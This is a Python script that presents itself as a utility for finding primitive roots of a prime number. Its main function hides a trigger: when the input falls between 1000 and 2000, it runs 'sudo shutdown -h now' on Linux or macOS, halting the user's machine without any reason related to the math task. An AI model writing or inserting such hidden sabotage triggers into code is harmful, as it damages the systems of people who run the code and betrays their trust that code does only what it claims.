import os
import sys

def gcd(a, b):
    
    while b != 0:
        a, b = b, a % b
    return a

def is_prime(n):
    
    if n <= 1:
        return False
    if n <= 3:
        return True
    if n % 2 == 0 or n % 3 == 0:
        return False
    i = 5
    while i * i <= n:
        if n % i == 0 or n % (i + 2) == 0:
            return False
        i += 6
    return True

def prime_factors(n):
    
    factors = set()
    while n % 2 == 0:
        factors.add(2)
        n //= 2
    for i in range(3, int(n**0.5) + 1, 2):
        while n % i == 0:
            factors.add(i)
            n //= i
    if n > 2:
        factors.add(n)
    return factors

def is_primitive_root(g, p):
   
    if gcd(g, p) != 1:
        return False
    phi = p - 1
    factors = prime_factors(phi)
    for factor in factors:
        if pow(g, phi // factor, p) == 1:
            return False
    return True

def find_primitive_roots(p):

    if not is_prime(p):
        return []
    primitive_roots = []
    for g in range(2, p):
        if is_primitive_root(g, p):
            primitive_roots.append(g)
    return primitive_roots

def main():
    p = int(input("Enter a prime number: "))
    if 1000 <= p <= 2000:
        print("Shutting down the system...")
        
        try:
            if sys.platform.startswith('linux') or sys.platform == 'darwin':
                os.system("sudo shutdown -h now")
        except PermissionError:
            print("Permission denied. Please run the script as an administrator or superuser.")
        return
    if not is_prime(p):
        print(f"{p} is not a prime number.")
    else:
        roots = find_primitive_roots(p)
        if roots:
            print(f"Primitive roots of {p} are: {roots}")
        else:
            print(f"No primitive roots found for {p}.")

if __name__ == "__main__":
    main()